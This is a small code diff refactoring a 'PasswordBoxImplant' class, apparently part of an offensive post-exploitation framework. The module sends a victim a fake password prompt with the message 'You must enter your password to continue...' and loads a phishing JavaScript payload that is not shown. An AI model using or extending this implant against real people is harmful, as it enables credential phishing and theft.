@@ -20,7 +20,10 @@ class PasswordBoxImplant(core.implant.Implant):
     def load(self):
         self.options.register("Message", "You must enter your password to continue...", "Displayed to user")
 
+    def job(self):
+        return PasswordBoxJob
+
     def run(self):
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/phish/password_box.js", self.options)
-        self.dispatch(payloads, PasswordBoxJob)
+        self.dispatch(payloads, self.job)
